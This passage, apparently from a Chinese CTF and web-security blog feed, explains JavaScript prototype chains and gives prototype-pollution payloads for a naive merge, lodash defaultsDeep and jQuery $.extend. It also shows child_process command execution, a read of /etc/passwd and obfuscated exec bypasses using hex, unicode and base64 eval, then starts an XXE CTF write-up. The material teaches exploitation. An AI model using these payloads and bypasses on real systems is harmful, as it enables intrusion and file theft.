href="#原型链的继承思想" class="headerlink" title="原型链的继承思想"></a>原型链的继承思想</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Father</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">first_name</span> = <span class="string">&#x27;Donald&#x27;</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">last_name</span> = <span class="string">&#x27;Trump&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">function</span> <span class="title function_">Son</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">first_name</span> = <span class="string">&#x27;Melania&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="title class_">Son</span>.<span class="property"><span class="keyword">prototype</span></span> = <span class="keyword">new</span> <span class="title class_">Father</span>()</span><br><span class="line"> </span><br><span class="line"><span class="keyword">let</span> son = <span class="keyword">new</span> <span class="title class_">Son</span>()</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`Name: <span class="subst">$&#123;son.first_name&#125;</span> <span class="subst">$&#123;son.last_name&#125;</span>`</span>)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(son.<span class="property">__proto__</span>)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(son.<span class="property">__proto__</span>.<span class="property">__proto__</span>)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(son.<span class="property">__proto__</span>.<span class="property">__proto__</span>.<span class="property">__proto__</span>)</span><br></pre></td></tr></table></figure><p>Son类继承了Father类的<code>last_name</code>属性，最后输出的是<code>Name: Melania Trump</code></p><p><img src="/img/Nodejs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/nodejs.png" alt=""></p><blockquote><p>总结一下，对于对象son，在console.log() 调用son.last_name的时候，实际上JavaScript引擎会进行如下操作：</p><p>在对象son中寻找last<em>name<br>如果找不到，则在son.<strong>proto</strong>中寻找last<em>name<br>如果仍然找不到，则继续在son.<strong>proto</strong>.<strong>proto</strong>中寻找last_name<br>依次寻找，直到找到null结束。比如，Object.prototype的__proto</em></em>就是null</p></blockquote><p>类似于Java里面继承的思想，如果子类没有这个属性, 往上继承父类. 有的话就自己用自己的</p><p> JavaScript的这个查找的机制，被运用在面向对象的继承中，被称作prototype继承链</p><ul><li>每个构造函数(constructor)都有一个原型对象(prototype)</li><li>对象的<code>__proto__</code>属性，指向类的原型对象prototype</li><li>JavaScript使用prototype链实现继承机制</li></ul><h1 id="原型链污染"><a href="#原型链污染" class="headerlink" title="原型链污染"></a>原型链污染</h1><h2 id="简单介绍"><a href="#简单介绍" class="headerlink" title="简单介绍"></a>简单介绍</h2><ul><li>在javascript，每一个实例对象都有一个<code>__proto__</code>属性，这个实例属性指向对象的原型对象(即原型)。可以通过以下方式访问得到某一实例对象的原型对象：</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">objectname[<span class="string">&quot;__proto__&quot;</span>]</span><br><span class="line">objectname.<span class="property">__proto__</span></span><br><span class="line">objectname.<span class="property">constructor</span>.<span class="property"><span class="keyword">prototype</span></span></span><br></pre></td></tr></table></figure><ul><li>不同对象所生成的原型链如下(部分)：</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> o = &#123;<span class="attr">a</span>: <span class="number">1</span>&#125;;</span><br><span class="line"><span class="comment">// o对象直接继承了Object.prototype</span></span><br><span class="line"><span class="comment">// 原型链：</span></span><br><span class="line"><span class="comment">// o ---&gt; Object.prototype ---&gt; null</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">var</span> a = [<span class="string">&quot;aa&quot;</span>, <span class="string">&quot;lisi&quot;</span>, <span class="string">&quot;?&quot;</span>];</span><br><span class="line"><span class="comment">// 数组都继承于 Array.prototype</span></span><br><span class="line"><span class="comment">// 原型链：</span></span><br><span class="line"><span class="comment">// a ---&gt; Array.prototype ---&gt; Object.prototype ---&gt; null</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">function</span> <span class="title function_">f</span>(<span class="params"></span>)&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 函数都继承于 Function.prototype</span></span><br><span class="line"><span class="comment">// 原型链：</span></span><br><span class="line"><span class="comment">// f ---&gt; Function.prototype ---&gt; Object.prototype ---&gt; null</span></span><br></pre></td></tr></table></figure><p> 先来看一个简单的示例：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// foo是一个简单的JavaScript对象</span></span><br><span class="line"><span class="keyword">let</span> foo = &#123;<span class="attr">bar</span>: <span class="number">1</span>&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// foo.bar 此时为1</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(foo.<span class="property">bar</span>)</span><br><span class="line"> </span><br><span class="line"><span class="comment">// 修改foo的原型（即Object）</span></span><br><span class="line"> foo.<span class="property">__proto__</span>.<span class="property">bar</span> = <span class="number">2</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">// 由于查找顺序的原因，foo.bar仍然是1</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(foo.<span class="property">bar</span>)</span><br><span class="line"> </span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(foo.<span class="property">__proto__</span>)</span><br><span class="line"> </span><br><span class="line"><span class="comment">// 此时再用Object创建一个空的zoo对象</span></span><br><span class="line"><span class="keyword">let</span> zoo = &#123;&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// 查看zoo.bar</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(zoo.<span class="property">bar</span>)</span><br></pre></td></tr></table></figure><ul><li>首先建立一个foo对象，有一个bar属性为1. 此时它的原型对象 并没有，后面通过<code>foo.__proto__</code>指向了它的原型对象，也就等价于是 <code>foo.prototype</code>，即object。给 object 原型对象增加了bar属性，值为二 。 现在 object 有了(一个bar=2的prototype原型对象)。</li></ul><p><img src="/img/Nodejs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/nodejs_01.png" alt=""></p><ul><li><p>后面我们再次 let zoo = {} ，zoo对象是空的</p></li><li><p>但是在我们输出zoo.bar的时候，node.js的引擎就开始在zoo中查找，发现没有，去zoo.proto中查找，即在Object中查找，而我们的<code>foo.prototype.bar = 2</code>，就是给Object添加了一个bar属性，而这个属性则被zoo继承。</p></li></ul><p>这种修改了一个某个对象的原型对象，从而控制别的对象的操作，就是原型链污染</p><h2 id="merge操作导致原型链污染"><a href="#merge操作导致原型链污染" class="headerlink" title="merge操作导致原型链污染"></a>merge操作导致原型链污染</h2><p>merge操作是最常见可能控制键名的操作，也最能被原型链攻击</p><p>以对象merge为例，我们想象一个简单的merge函数：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">merge</span>(<span class="params">target, source</span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">in</span> source) &#123;</span><br><span class="line">        <span class="keyword">if</span> (key <span class="keyword">in</span> source &amp;&amp; key <span class="keyword">in</span> target) &#123;</span><br><span class="line">            <span class="title function_">merge</span>(target[key], source[key])</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            target[key] = source[key]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在合并的过程中，存在赋值的操作<code>target[key] = source[key]</code>，这个key如果是<code>__proto__</code>(json格式才可以被当成key)，是不是就可以原型链污染呢？</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> object1 = &#123;&#125;</span><br><span class="line"><span class="keyword">let</span> object2 = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(<span class="string">&#x27;&#123;&quot;a&quot;: 1, &quot;__proto__&quot;: &#123;&quot;b&quot;: 2&#125;&#125;&#x27;</span>)</span><br><span class="line"><span class="title function_">merge</span>(object1, object2)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(object1.<span class="property">a</span>, object1.<span class="property">b</span>)</span><br><span class="line"> </span><br><span class="line">object3 = &#123;&#125;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(object3.<span class="property">b</span>)</span><br><span class="line"><span class="comment">// 1 2</span></span><br><span class="line"><span class="comment">// 2</span></span><br></pre></td></tr></table></figure><p>需要注意的点是：</p><p>在JSON解析的情况下，<code>__proto__</code>会被认为是一个真正的“键名”，而不代表“原型”，所以在遍历object2的时候会存在这个键。</p><h2 id="ejs污染"><a href="#ejs污染" class="headerlink" title="ejs污染"></a>ejs污染</h2><p>参考：<a href="https://evi0s.com/2019/08/30/expresslodashejs-从原型链污染到rce/">Express+lodash+ejs: 从原型链污染到RCE - evi0s’ Blog</a></p><h2 id="lodash污染"><a href="#lodash污染" class="headerlink" title="lodash污染"></a>lodash污染</h2><p><code>lodash.defaultsDeep(obj,JSON.parse(objstr));</code></p><p>只需要有<code>objstr</code>为</p><p><code>&#123;&quot;content&quot;:&#123;&quot;prototype&quot;:&#123;&quot;constructor&quot;:&#123;&quot;a&quot;:&quot;b&quot;&#125;&#125;&#125;&#125;</code></p><p>在合并时便会在Object上附加a=b这样一个属性</p><p>lodash 是一个非常流行的JavaScript工具库</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> mergeFn = <span class="built_in">require</span>(<span class="string">&#x27;lodash&#x27;</span>).<span class="property">defaultsDeep</span>;</span><br><span class="line"><span class="keyword">const</span> payload = <span class="string">&#x27;&#123;&quot;constructor&quot;: &#123;&quot;prototype&quot;: &#123;&quot;a0&quot;: true&#125;&#125;&#125;&#x27;</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">function</span> <span class="title function_">check</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="title function_">mergeFn</span>(&#123;&#125;, <span class="title class_">JSON</span>.<span class="title function_">parse</span>(payload));</span><br><span class="line">    <span class="keyword">if</span> ((&#123;&#125;)[<span class="string">`a0`</span>] === <span class="literal">true</span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`Vulnerable to Prototype Pollution via <span class="subst">$&#123;payload&#125;</span>`</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line"><span class="title function_">check</span>();</span><br></pre></td></tr></table></figure><p>运行上面的js语句，就可以检查这个版本的lodash是否存在这个漏洞。</p><p>其中漏洞关键触发点在<strong>defaultsDeep函数</strong>，它将<code>(&#123;&#125;, JSON.parse(payload))</code>merge时，就可能导致原型链污染。使用JSON.parse就是保证合并时能以字典解析，而不是字符串</p><h2 id="JQuery污染"><a href="#JQuery污染" class="headerlink" title="JQuery污染"></a>JQuery污染</h2><p>JQuery 是一个非常流行的Js前端工具库，而它也存在原型链污染漏洞</p><p><img src="/img/Nodejs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/nodejs_02.png" alt=""></p><p>可以看到</p><p><code>$.extend(true,&#123;&#125;,JSON.parse(&#39;&#123;&quot;__proto__&quot;:&#123;&quot;aa&quot;:&quot;hello&quot;&#125;&#125;&#39;))</code></p><p>Jquery可以用$.extend将两个字典merge，而这也因此污染了原型链。</p><h1 id="Nodejs语言特性"><a href="#Nodejs语言特性" class="headerlink" title="Nodejs语言特性"></a>Nodejs语言特性</h1><h2 id="js大小写特性"><a href="#js大小写特性" class="headerlink" title="js大小写特性"></a>js大小写特性</h2><p>对于<code>toUpperCase()</code>函数</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">字符<span class="string">&quot;ı&quot;</span>、<span class="string">&quot;ſ&quot;</span> 经过toUpperCase处理后结果为 <span class="string">&quot;I&quot;</span>、<span class="string">&quot;S&quot;</span></span><br></pre></td></tr></table></figure><p>对于<code>toLowerCase</code></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">字符<span class="string">&quot;K&quot;</span>经过toLowerCase处理后结果为<span class="string">&quot;k&quot;</span>(这个K不是K)</span><br></pre></td></tr></table></figure><p>详情：<a href="https://www.leavesongs.com/HTML/javascript-up-low-ercase-tip.html">Fuzz中的javascript大小写特性 | 离别歌 (leavesongs.com)</a></p><h2 id="弱类型比较"><a href="#弱类型比较" class="headerlink" title="弱类型比较"></a>弱类型比较</h2><ul><li>数字与字符串比较时，会优先将纯数字型字符串转为数字之后再进行比较</li><li>字符串与字符串比较时，会将字符串的第一个字符转为ASCII码之后再进行比较</li><li>非数字型字符串与数字进行任何比较结果都是<code>false</code></li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">1</span>==<span class="string">&#x27;1&#x27;</span>); <span class="comment">//true </span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">1</span>&gt;<span class="string">&#x27;2&#x27;</span>); <span class="comment">//false </span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;1&#x27;</span>&lt;<span class="string">&#x27;2&#x27;</span>); <span class="comment">//true </span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">111</span>&gt;<span class="string">&#x27;3&#x27;</span>); <span class="comment">//true </span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;111&#x27;</span>&gt;<span class="string">&#x27;3&#x27;</span>); <span class="comment">//false </span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;asd&#x27;</span>&gt;<span class="number">1</span>); <span class="comment">//false</span></span><br></pre></td></tr></table></figure><ul><li>空数组之间比较永远为false</li><li>数组之间比较只比较数组的第一个值，对第一个值采用上面的比较方法</li><li>数组与非数值型字符串比较，数组永远小于非数值型字符串</li><li>数组与数值型字符串比较，取第一个之后按前面总结的方法进行比较</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>([]==[]); <span class="comment">//false </span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>([]&gt;[]); <span class="comment">//false</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>([<span class="number">6</span>,<span class="number">2</span>]&gt;[<span class="number">5</span>]); <span class="comment">//true </span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>([<span class="number">100</span>,<span class="number">2</span>]&lt;<span class="string">&#x27;test&#x27;</span>); <span class="comment">//true </span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>([<span class="number">1</span>,<span class="number">2</span>]&lt;<span class="string">&#x27;2&#x27;</span>);  <span class="comment">//true </span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>([<span class="number">11</span>,<span class="number">16</span>]&lt;<span class="string">&quot;10&quot;</span>); <span class="comment">//false</span></span><br></pre></td></tr></table></figure><p>一些特殊的相等：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="literal">null</span>==<span class="literal">undefined</span>) <span class="comment">// 输出：true </span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="literal">null</span>===<span class="literal">undefined</span>) <span class="comment">// 输出：false </span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">NaN</span>==<span class="title class_">NaN</span>)  <span class="comment">// 输出：false </span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">NaN</span>===<span class="title class_">NaN</span>)  <span class="comment">// 输出：false</span></span><br></pre></td></tr></table></figure><p>变量拼接：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">5</span>+[<span class="number">6</span>,<span class="number">6</span>]); <span class="comment">//56,6</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;5&quot;</span>+<span class="number">6</span>); <span class="comment">//56 </span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;5&quot;</span>+[<span class="number">6</span>,<span class="number">6</span>]); <span class="comment">//56,6 </span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;5&quot;</span>+[<span class="string">&quot;6&quot;</span>,<span class="string">&quot;6&quot;</span>]); <span class="comment">//56,6s</span></span><br></pre></td></tr></table></figure><h3 id="MD5绕过"><a href="#MD5绕过" class="headerlink" title="MD5绕过"></a>MD5绕过</h3><ul><li><p>跟php很像的数组绕过</p></li><li><p>如：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a &amp;&amp; b &amp;&amp; a.<span class="property">length</span>===b.<span class="property">length</span> &amp;&amp; a!==b &amp;&amp; <span class="title function_">md5</span>(a+flag)===<span class="title function_">md5</span>(b+flag)</span><br></pre></td></tr></table></figure></li><li><p>payload：<code>a[x]=1&amp;b[x]=2</code>，数组会被解析成<code>[object Object]</code></p></li></ul><h3 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h3><ul><li>16进制编码：<code>console.log(&quot;a&quot;===&quot;\x61&quot;); // true</code></li><li>unicode编码：<code>console.log(&quot;\u0061&quot;===&quot;a&quot;); // true</code></li><li>base编码：<code>eval(Buffer.from(&#39;Y29uc29sZS5sb2coImhhaGFoYWhhIik7&#39;,&#39;base64&#39;).toString())</code></li></ul><h1 id="Nodejs危险函数的利用"><a href="#Nodejs危险函数的利用" class="headerlink" title="Nodejs危险函数的利用"></a>Nodejs危险函数的利用</h1><h2 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h2><ul><li><code>exec()</code>：</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>).<span class="title function_">exec</span>(<span class="string">&#x27;open /System/Applications/Calculator.app&#x27;</span>);</span><br></pre></td></tr></table></figure><ul><li><code>eval()</code>：</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="built_in">eval</span>(<span class="string">&quot;document.cookie&quot;</span>)); <span class="comment">//执行document.cookie</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;document.cookie&quot;</span>); <span class="comment">//输出document.cookie</span></span><br></pre></td></tr></table></figure><h2 id="文件读写"><a href="#文件读写" class="headerlink" title="文件读写"></a>文件读写</h2><p><strong>读：</strong></p><ul><li><p><code>readFile()</code>：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>).<span class="title function_">readFile</span>(<span class="string">&#x27;/etc/passwd&#x27;</span>, <span class="string">&#x27;utf-8&#x27;</span>, <span class="function">(<span class="params">err, data</span>) =&gt;</span> &#123;</span><br><span class="line"> <span class="keyword">if</span> (err) <span class="keyword">throw</span> err;</span><br><span class="line"> <span class="variable language_">console</span>.<span class="title function_">log</span>(data);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></li></ul><ul><li><code>readFileSync()</code>：</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>).<span class="title function_">readFileSync</span>(<span class="string">&#x27;/etc/passwd&#x27;</span>,<span class="string">&#x27;utf-8&#x27;</span>)</span><br></pre></td></tr></table></figure><p><strong>写：</strong></p><ul><li><p><code>writeFileSync()</code>：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>).<span class="title function_">writeFileSync</span>(<span class="string">&#x27;input.txt&#x27;</span>,<span class="string">&#x27;sss&#x27;</span>);</span><br></pre></td></tr></table></figure></li><li><p><code>writeFile()</code>：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>).<span class="title function_">writeFile</span>(<span class="string">&#x27;input.txt&#x27;</span>,<span class="string">&#x27;test&#x27;</span>,<span class="function">(<span class="params">err</span>)=&gt;</span>&#123;&#125;)</span><br></pre></td></tr></table></figure></li></ul><h2 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h2><p><strong>原型：</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">require</span>(<span class="string">&quot;child_process&quot;</span>).<span class="title function_">execSync</span>(<span class="string">&#x27;cat flag.txt&#x27;</span>)</span><br></pre></td></tr></table></figure><p><strong>字符拼接：</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">require</span>(<span class="string">&quot;child_process&quot;</span>)[<span class="string">&#x27;exe&#x27;</span>%2b<span class="string">&#x27;cSync&#x27;</span>](<span class="string">&#x27;cat flag.txt&#x27;</span>)<span class="comment">//(%2b就是+的url编码)</span></span><br><span class="line"><span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>)[<span class="string">&quot;exe&quot;</span>.<span class="title function_">concat</span>(<span class="string">&quot;cSync&quot;</span>)](<span class="string">&quot;cat flag.txt&quot;</span>)</span><br></pre></td></tr></table></figure><p><strong>编码绕过：</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">require</span>(<span class="string">&quot;child_process&quot;</span>)[<span class="string">&quot;\x65\x78\x65\x63\x53\x79\x6e\x63&quot;</span>](<span class="string">&#x27;cat flag.txt&#x27;</span>)</span><br><span class="line"><span class="built_in">require</span>(<span class="string">&quot;child_process&quot;</span>)[<span class="string">&quot;\u0065\u0078\u0065\u0063\u0053\x79\x6e\x63&quot;</span>](<span class="string">&#x27;cat flag.txt&#x27;</span>)</span><br><span class="line"><span class="built_in">eval</span>(<span class="title class_">Buffer</span>.<span class="title function_">from</span>(<span class="string">&#x27;cmVxdWlyZSgiY2hpbGRfcHJvY2VzcyIpLmV4ZWNTeW5jKCdjYXQgZmxhZy50eHQnKTs=&#x27;</span>,<span class="string">&#x27;base64&#x27;</span>).<span class="title function_">toString</span>())</span><br></pre></td></tr></table></figure><p><strong>模板拼接：</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">require</span>(<span class="string">&quot;child_process&quot;</span>)[<span class="string">`<span class="subst">$&#123;<span class="string">`<span class="subst">$&#123;<span class="string">`exe`</span>&#125;</span>cSync`</span>&#125;</span>`</span>](<span class="string">&#x27;cat flag.txt&#x27;</span>）</span><br></pre></td></tr></table></figure><p><strong>其他函数：</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">require</span>(<span class="string">&quot;child_process&quot;</span>).<span class="title function_">exec</span>(<span class="string">&quot;sleep 3&quot;</span>); </span><br><span class="line"><span class="built_in">require</span>(<span class="string">&quot;child_process&quot;</span>).<span class="title function_">execSync</span>(<span class="string">&quot;sleep 3&quot;</span>); </span><br><span class="line"><span class="built_in">require</span>(<span class="string">&quot;child_process&quot;</span>).<span class="title function_">execFile</span>(<span class="string">&quot;/bin/sleep&quot;</span>,[<span class="string">&quot;3&quot;</span>]); *<span class="comment">//调用某个可执行文件，在第二个参数传args* </span></span><br><span class="line"><span class="built_in">require</span>(<span class="string">&quot;child_process&quot;</span>).<span class="title function_">spawn</span>(<span class="string">&#x27;sleep&#x27;</span>, [<span class="string">&#x27;3&#x27;</span>]); </span><br><span class="line"><span class="built_in">require</span>(<span class="string">&quot;child_process&quot;</span>).<span class="title function_">spawnSync</span>(<span class="string">&#x27;sleep&#x27;</span>, [<span class="string">&#x27;3&#x27;</span>]); </span><br><span class="line"><span class="built_in">require</span>(<span class="string">&quot;child_process&quot;</span>).<span class="title function_">execFileSync</span>(<span class="string">&#x27;sleep&#x27;</span>, [<span class="string">&#x27;3&#x27;</span>])</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Nodejs </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XXE-wp</title>
      <link href="/2023/08/03/XXE-wp/"/>
      <url>/2023/08/03/XXE-wp/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><h1 id="NCTF2019-True-XML-cookbook"><a href="#NCTF2019-True-XML-cookbook" class="headerlink" title="[NCTF2019]True XML cookbook"></a>[NCTF2019]True XML cookbook</h1><p>打开后发现一个登陆界面</p><p>没有什么提示信息，尝试用bp抓个包：</p><p><img src="/img/XXE-wp/xxe_04.png" alt=""></p><p>尝试xxe文件读取测试：</p><p><img src="/img/XXE-wp/xxe_05.png" alt=""></p><p>成功回显！尝试读取flag：</p><p><img src="/img/XXE-wp/xxe_06.png" alt=""></p><p>读取失败，尝试读取其他敏感文件（<code>/etc/hosts</code>，<code>/proc/net/fib_trie</code>，<code>/proc/net/arp</code>）:</p><p>读取<code>/etc/hosts</code>：</p><p><img src="/img/XXE-wp/xxe_09.png" alt=""></p><p>读取<code>/proc/net/fib_trie</code>：</p><p><img src="/img/XXE-wp/xxe_08.png" alt=""></p><p>读取<code>/proc/net/arp</code>：</p><p><img src="/img/XXE-wp/xxe_07.png" alt=""></p><p>发现有几个ip，分别尝试访问一下：</p><p>发现访问10.244.80.230时，出现报错：</p><p><img src="/img/XXE-wp/xxe_10.png" alt=""></p><p>尝试bp爆破C段：</p><p>爆破成功！</p><p><img src="/img/XXE-wp/xxe_11.png" alt=""></p><h1 id="NCTF2019-Fake-XML-cookbook"><a href="#NCTF2019-Fake-XML-cookbook" class="headerlink" title="[NCTF2019]Fake XML 